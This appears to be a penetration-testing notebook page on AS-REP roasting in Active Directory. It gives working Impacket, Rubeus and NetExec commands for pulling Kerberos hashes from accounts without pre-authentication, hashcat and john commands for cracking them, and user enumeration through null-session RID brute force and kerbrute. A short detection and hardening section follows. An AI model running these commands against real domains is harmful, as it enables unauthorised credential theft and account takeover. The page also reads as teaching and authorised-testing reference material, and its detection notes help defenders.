---
tags: [pentest, kerberos, asrep-roast, ad, active-directory, initial-access, windows]
phase: 5
---
# AS-REP Roasting

Request an AS-REP (Authentication Service response) for users whose `DONT_REQ_PREAUTH` flag is set. The AS-REP contains a portion encrypted with the user's NTLM hash - crack offline. **No credential needed** (only a username list).

[[06 - Gaining Access/00 - README|Folder index]]

## Why it works

Normally, Kerberos requires pre-authentication: the client encrypts a timestamp with the user's key and sends it; KDC validates before issuing a TGT. If pre-auth is disabled (`DONT_REQ_PREAUTH`), the KDC just hands out an AS-REP encrypted with the user's key.

## Requirements

- Network access to the DC (port 88).
- A username list (legitimate or guessed).

## Run

### Linux (Impacket)

```bash
# Without any cred
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.0.0.5 -outputfile asrep.hash

# With a cred (gets every user who has DONT_REQ_PREAUTH in one shot)
impacket-GetNPUsers corp.local/user:pass -dc-ip 10.0.0.5 -request -outputfile asrep.hash

# Format option (john vs hashcat compatible)
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.0.0.5 -format hashcat -outputfile asrep.hash
```

### Windows (Rubeus)

```cmd
Rubeus.exe asreproast /outfile:asrep.txt
Rubeus.exe asreproast /user:alice /outfile:alice.txt
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### NetExec

```bash
nxc ldap <dc-ip> -u user -p pass --asreproast asrep.txt
```

## Crack

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=krb5asrep --wordlist=rockyou.txt asrep.hash
```

## Hash format

```text
$krb5asrep$23$alice@CORP.LOCAL:abc123...
            ^^ etype 23 = RC4 (default for AS-REP roast - always crackable speed)
```

## Build the user list

If you don't have any creds yet:

```bash
# Null SMB session - RID brute
nxc smb <dc-ip> -u '' -p '' --rid-brute > raw.txt
awk -F: '/SidTypeUser/{print $1}' raw.txt | cut -d'\' -f2 > users.txt

# Or kerbrute - works with just DC name
kerbrute userenum -d corp.local --dc <dc-ip> \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid.txt
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` for every user | User list is wrong (bad usernames). Verify usernames via SAMR or kerbrute. |
| `KDC_ERR_PREAUTH_REQUIRED` for every user | No accounts have DONT_REQ_PREAUTH. Move on (most well-managed domains don't). |
| AS-REP returned, but won't crack | Strong password. Try rules / targeted wordlist (company name + years). |
| `KRB_AP_ERR_SKEW` | Clock skew - `sudo ntpdate <dc>`. |
| Hashes look fine but hashcat says "0 hashes loaded" | Check format. Use `-format hashcat` flag on impacket. |

## Detection

- Event ID **4768** on DC with `Pre-Authentication Type: 0` (unusual; preauth=0 means no preauth).
- Audit "Audit Kerberos Authentication Service" on DCs.
- Disable `DONT_REQ_PREAUTH` on all accounts unless explicitly needed.

> [!tip] AS-REP roast is the quietest credential attack
> No prior cred needed, single LDAP-less Kerberos request per user. Always try it before more invasive techniques.

## See also

- [[15 - Kerberoasting]]
- [[../04 - Enumeration/12 - kerbrute]]
